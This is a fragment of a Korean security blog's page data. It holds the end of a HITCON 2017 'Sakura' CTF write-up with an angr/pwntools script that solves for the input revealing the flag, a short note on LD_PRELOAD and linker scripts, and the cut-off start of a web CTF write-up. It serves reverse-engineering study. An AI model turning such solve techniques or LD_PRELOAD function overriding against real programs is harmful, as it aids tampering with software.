url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABRElEQVQY012Oy07CQBSG+yw+gi/kxo2v4CO4cKUb4wVj4s6EIIlGFySWFjGGDQGJmZZemF6ddsq0UzotM6agaPjO2Z3zf+dImmnJ/aH6PppoKZoLIfiqBMIxIUmaZqJijbfwoOm1P0g95mKDpN1eK0f7r8d708YlbvWKp071+Mzb98l4vF5jZZXmi5V1G0m/OO21dvudHad5iM8f4qs7enlDTs6SweAvTBdbN3/CYDiSZVntq59DBxkZi+YiSTjGse9nlOY5JSQNIoxJFs9JVrAsLzYtAV2X5RdVkceT0LCFF/Kyqq1BGFqW5bqu53kAANM0bdtGK6JfJA2AbldWVcUwvuBMBP6yKrngSz8IIJy5jgMhRAjFcRxFSNd1y7LWLgCABACo31YVz0NFIRjjlJaUloEfTHUdQogxJoTguIYxVv7jGynUeeCQA5IOAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/70f61871d08e0ef5cccd1b9630fbb94d/37523/10.png\"\n        srcset=\"/static/70f61871d08e0ef5cccd1b9630fbb94d/e9ff0/10.png 180w,\n/static/70f61871d08e0ef5cccd1b9630fbb94d/f21e7/10.png 360w,\n/static/70f61871d08e0ef5cccd1b9630fbb94d/37523/10.png 720w,\n/static/70f61871d08e0ef5cccd1b9630fbb94d/0eb6d/10.png 913w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>오프셋 차이가 <code class=\"language-text\">7</code> 차이가 나기때문에 False의 주소 + 7을 하여 True를 구해내야 하며 또한 허용해야 할 주소 값이 계산되서 나왔다면 전부 값에 넣을 것이 아니라</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfUlEQVQoz3WPy24TURBE/e3sWCAW8AMQQuTYifgAlIyzg5WTmTFCQVFswDB2PHOffbvvoxsFsgjClGpXOt1Vo7ZtZ7OLT4vG2jPn3hlzYy2nlCNl40GB7mGwZBUqhYqF5ZFGTdNU1XldL9ZrMUYQmZkBknNxvbZb0xu0LBxzjDnK33qA5/NmtcqlFPl921ra7eDbd12KBAhGGwrEhffAs9msrq/u7j6EcE60ZhbE5H3qtmYzKOOtBx8o5JL3wlVTt5sN9L0HQIAUwj08KIAIGnVIwZGzZPdvns/b5ZIBJKX72PuoFK6+Ko8BMRIS4X9qV1V1edleX/NyKc49bB768GX547q73fYqp1SY98FX8+rs/aKprRZwEjFHJAIKDtVgiYJ1JqBHgoCeU+KcpZQ/HjW3XfXxc33T/XSlj1knjiIkEop0mLsYNbOW0nPy8s/n9vmLiydP62cvdwen6s1Uvx7Dq7c0nsL4VB2d7Kbj3fGBPjkapof95JAnE3nkX0rFKjJ5sziKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/22da3ca737e8d83b0278c59dac031594/37523/11.png\"\n        srcset=\"/static/22da3ca737e8d83b0278c59dac031594/e9ff0/11.png 180w,\n/static/22da3ca737e8d83b0278c59dac031594/f21e7/11.png 360w,\n/static/22da3ca737e8d83b0278c59dac031594/37523/11.png 720w,\n/static/22da3ca737e8d83b0278c59dac031594/6bfd0/11.png 1011w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>첫 번째 , 두 번째 조건은 건너 뛰고 세 번째 부분을 허용 값에 넣어야 한다.</li>\n<li>그러면 이제 Solve 를 작성해보자</li>\n</ul>\n<h2 id=\"solved-code-1\" style=\"position:relative;\"><a href=\"#solved-code-1\" aria-label=\"solved code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solved Code 1</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> angr\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nPATH<span class=\"token operator\">=</span><span class=\"token string\">'./sakura'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> PATH\n\t\t<span class=\"token comment\"># 바이트로 읽어오도록 한다.</span>\n    data <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./sakura\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    find_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    avoid_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    idx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token comment\"># avoid 할 패턴</span>\n        res <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\xC6\\x85\\xB7\\xE1\\xFF\\xFF\\x00\"</span><span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> res <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">break</span>\n        <span class=\"token comment\"># 베이스 주소는 0x100000을 하든 상관 없다.</span>\n        avoid_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0x400000</span> <span class=\"token operator\">+</span> res<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># find 조건 </span>\n        <span class=\"token keyword\">if</span> cnt <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n            find_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0x400000</span> <span class=\"token operator\">+</span> res <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n            \n        cnt <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        idx <span class=\"token operator\">=</span> res <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token comment\"># aovid 패턴의 오프셋만큼 더해가면서 다음 오프셋을 찾아낸다.</span>\n\n    p <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span><span class=\"token string\">'./sakura'</span><span class=\"token punctuation\">)</span>\n    state <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> find <span class=\"token keyword\">in</span> find_list<span class=\"token punctuation\">:</span>\n        sm<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token comment\"># 순차적으로 find조건을 만족 하는지르 확인하기 위해 for문을 돌렸다.</span>\n\t\t\t\t<span class=\"token comment\"># 루프를 돌리지 않고 한번에 바로 해도 된다.</span>\n        sm<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>find<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>avoid_list<span class=\"token punctuation\">)</span>\n        state<span class=\"token operator\">=</span>sm<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span>\n        \n    p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span>PATH<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 프로세스 attach</span>\n    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 출력 값을 read 함수로 보내버린다.</span>\n    flag <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 응답 받고 출력</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqElEQVQI1wXBSQ6CMBQAUC5CQqFMUspcfgcsUIsGEOMBNO7ceP+17zl2u9/2Y90fdj3I89VKDSCAq5bxsu5axpu2V0oLeQZQn+jyi9Y3jw32vqF1NMhxsnKyoCapNOsFo1VXNkVKsiglUUrjUxEmeZiEQexj38W+h+IAJy4OnIqNg9mGycIwcz0zZQpuKZhazDkbKV+ouBJYSG98qlAmUSZQxr2UoRP8AXg8JlcnE2ulAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/71183e88b5dfdc2f53a4363d5e602736/37523/12.png\"\n        srcset=\"/static/71183e88b5dfdc2f53a4363d5e602736/e9ff0/12.png 180w,\n/static/71183e88b5dfdc2f53a4363d5e602736/f21e7/12.png 360w,\n/static/71183e88b5dfdc2f53a4363d5e602736/37523/12.png 720w,\n/static/71183e88b5dfdc2f53a4363d5e602736/eafa0/12.png 939w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\">바이너리 실행 결과</a></li>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\">바이너리 정보</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#sub_850-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_850 함수 분석</a></li>\n<li><a href=\"#solved-code\">Solved Code</a></li>\n<li><a href=\"#solved-code-1\">Solved Code 1</a></li>\n</ul>\n</div>","excerpt":"취약점 분석 바이너리 실행 결과  입력 대기중 😑 바이너리 정보  main 함수 분석   번 루틴을 돌면서  함수를 바탕으로 입력을 받는다. 입력을 받을시 해당  버퍼를 사용하는데 해당 사이즈는 400바이트임을 계산할 수 있다.  루틴을 돌면서 400바이트 입력을 받은후 해당  를 인자로 하여  함수를 호출한후 해당 반환 값을 0이 아닐경우 FLAG 값을 출력하는 것을 확인할 수 있다. 출력 중간 사이에  함수가 보일텐데 해당 함수는  으로 해쉬화 하여 출력을 한다 즉, 해당 함수는 출력을 해쉬화 하는 과정이고 우리가 알아야 할 것은 어떤 걸 해쉬화를 하는지 입력 값을 바탕으로 어떤 조건을 통해 해쉬화 가되어지는지를 알아야 한다. sub_850 함수 분석 _start  _end  무려 시작과 끝의 옵셋 차이가 67493이 가 나는 함수 영역이다. …  처음 프롤로그 부분에서 스택 영역을  만큼이나 할당해준 후 무수히 많은 변수에 값을 대입하고 있다.  비슷한 구조로 한 블록에서 루…","frontmatter":{"date":"August 16, 2020","title":"HitCon2017 Sakura 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🥞"},"fields":{"slug":"/hitcon2017_sakura_ctf_writeup/2020-08-16-HITCON2017-sakura/"}},"next":{"id":"5a1f88d6-ed8e-53e3-88bb-4450a6a7a8df","html":"<h2 id=\"ld_preload-환경-변수\" style=\"position:relative;\"><a href=\"#ld_preload-%ED%99%98%EA%B2%BD-%EB%B3%80%EC%88%98\" aria-label=\"ld_preload 환경 변수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>LD_PRELOAD 환경 변수</h2>\n<ul>\n<li>다른 라이브러리보다 먼저 동적으로 링크하도록 라이브러리 경로를 지정한다.</li>\n<li>해당 설정은 사전에 로드하는 라이브러리의 함수나 심볼을 나중에 링크되는 라이브러리 함수나 심볼을 오버라이드 한다.</li>\n<li>공유 라이브러리 함수를 리다렉션하여 런타임 패치를 수행한다.</li>\n</ul>\n<h2 id=\"ld_show_auxv-환경-변수\" style=\"position:relative;\"><a href=\"#ld_show_auxv-%ED%99%98%EA%B2%BD-%EB%B3%80%EC%88%98\" aria-label=\"ld_show_auxv 환경 변수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>LD_SHOW_AUXV 환경 변수</h2>\n<ul>\n<li>실행하는 동안 프로그램의 보조 벡터를 출력하도록 프로그램 로더에게 알린다.</li>\n<li><code class=\"language-text\">보조 벡터</code> 는 프로그램의 스택 (커널의 ELF 로딩 루틴에 의한)에 위치한 정보로 프로그램에 관한 특정 정보와 함께 동적 링커로 전달된다.</li>\n<li>해당 정보는 리버싱과 디버깅에 유용하다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA20lEQVQoz5XQ0W6DIACF4T7HxqqCKBQqUNBJZpNpi6tYdcabvf+TLL7AdMl/++Uk5/AYZj8tMGUit/280EzB9PQGExAlQUz+7vD1/G77EUSYq7yqHSL8NYxDTENMt/G9G5rWH2FChZa5VbnNdBHE6aZccTfOtfMgwpkpb90gzDsifI9csZ+W8uPzJUBcGUQ4iBIQ4b247af74xnGhAqNTxki/B/Lzo/T8oMIZ9JUtdNlJY09wmQXvjZt7fz5UqRcXRvHlKFCI8J2YWmsWCuZNNmlYNJwla/jaPvwX2ZIWKrwUohuAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/c7618e310a37d63bb06cc303d105eb43/37523/0.png\"\n        srcset=\"/static/c7618e310a37d63bb06cc303d105eb43/e9ff0/0.png 180w,\n/static/c7618e310a37d63bb06cc303d105eb43/f21e7/0.png 360w,\n/static/c7618e310a37d63bb06cc303d105eb43/37523/0.png 720w,\n/static/c7618e310a37d63bb06cc303d105eb43/62de4/0.png 746w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>프로세스 이미지에 위치한 <code class=\"language-text\">VDSO</code> 페이지의 메모리 주소는 <code class=\"language-text\">AT_SYSINFO</code> 를 확인해야 한다.</li>\n</ul>\n<h2 id=\"링커-스크립트\" style=\"position:relative;\"><a href=\"#%EB%A7%81%EC%BB%A4-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8\" aria-label=\"링커 스크립트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>링커 스크립트</h2>\n<ul>\n<li>링커 스크립트는 링커가 해석해 섹션, 메모리, 심볼 등 프로그램의 레이아웃을 구성한다.</li>\n<li>기본 링커 스크립터는 <code class=\"language-text\">ld -verbose</code> 명령어로 확인한다.</li>\n<li><code class=\"language-text\">ld</code> 링커 프로그램은 (재배치 가능한 객체 파일, 공유 라이브러리, 헤더 파일 등) 입력 파일을 받을 때 해석된다.</li>\n<li>해당 스크립트는 실행 프로그램과 같은 출력 파일을 어떻게 구성할지 지정한다.</li>\n<li>출력이 ELF 실행 파일이라면 링커 스크립트는 어떻게 배치하고 각 세그먼트에 섹션을 지정할 사용한다.</li>\n<li><code class=\"language-text\">.bss</code> 섹션은 항상 데이터 세그먼트 끝에 위치하며 이는 링커 스크립트에 의해 결정된다.</li>\n<li>컴파일하는 동안 링킹 과정에 대한 분석은 중요하다. <code class=\"language-text\">gcc</code> 는 해당 작업을 할 때 링커와 다른 프로그램에 의존한다.</li>\n<li>일부, 실행 파일의 배치를 제어 할 수 있다는 것은 매우 중요한 사실</li>\n</ul>\n<hr>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#ld_preload-%ED%99%98%EA%B2%BD-%EB%B3%80%EC%88%98\">LD_PRELOAD 환경 변수</a></li>\n<li><a href=\"#ld_show_auxv-%ED%99%98%EA%B2%BD-%EB%B3%80%EC%88%98\">LD_SHOW_AUXV 환경 변수</a></li>\n<li><a href=\"#%EB%A7%81%EC%BB%A4-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8\">링커 스크립트</a></li>\n</ul>\n</div>","frontmatter":{"date":"August 16, 2020","title":"리눅스 링커 환경 변수","categories":"AnalyzingBinaries","author":"Zer0Luck","emoji":"🎁"},"fields":{"slug":"/elf_device_file3/"}},"prev":{"id":"8b2db8ca-f6eb-549e-abaf-e661c224717d","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>Name\nmusicBlog</p>\n</blockquote>\n<blockquote>\n<p>Description\nYou can introduce favorite songs to friends with MusicBlog!</p>\n</blockquote>\n<blockquote>\n<p>File\nMusicBlog.tar.gz</p>\n</blockquote>\n<h2 id=\"dockerfile-분석\" style=\"position:relative;\"><a href=\"#dockerfile-%EB%B6%84%EC%84%9D\" aria-label=\"dockerfile 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DockerFile 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAApElEQVQI11WOyxKCIABF+RWyCV8ooCgYj/ABOuai//+ZmqnMZs7ibs7cA7wwdlzsuOjeo5xClMFLBlF++hLFOIrxvs9J8SEtwSTtbVpMP2sXlPNCuVY5Lk0ldCU05V1RibLuWKtoc03L+uiDUejer0PYhnkL90cfNufXksucNpi1GeEopzFmCWYxZpeM/J6TAkxMGjsSLiuhCe/ehfC/eedovuQnuIAubUVzg5oAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/0a3dbac156713c43eaf10f4966a02558/37523/0.png\"\n        srcset=\"/static/0a3dbac156713c43eaf10f4966a02558/e9ff0/0.png 180w,\n/static/0a3dbac156713c43eaf10f4966a02558/f21e7/0.png 360w,\n/static/0a3dbac156713c43eaf10f4966a02558/37523/0.png 720w,\n/static/0a3dbac156713c43eaf10f4966a02558/cda19/0.png 785w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>PHP 7.4.0 버전을 사용하는 것을 확인할 수 있으며 해당 버전에 맞는 버그를 바탕으로 flag를 획득할 수 있겠다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">함수이름</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">await</span> 비동기 처리 메서드 <span class=\"token function\">명</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>함수의  앞에 async 라는 예약어를 붙인후, 함수 내부에서 비동기 처리가 필요한 메서드에 await를 붙여준다.</li>\n<li>await 붙인 메서드는 비동기 처리 메서드가 꼭 promise 객체를 반환해야 await가 의도한 대로 동작한다.</li>\n</ul>\n<h2 id=\"flag-문자열-찾기\" style=\"position:relative;\"><a href=\"#flag-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0\" aria-label=\"flag 문자열 찾기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag 문자열 찾기</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 647px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.88888888888889%; position: relative; bottom: 0; left: 0; background-image: 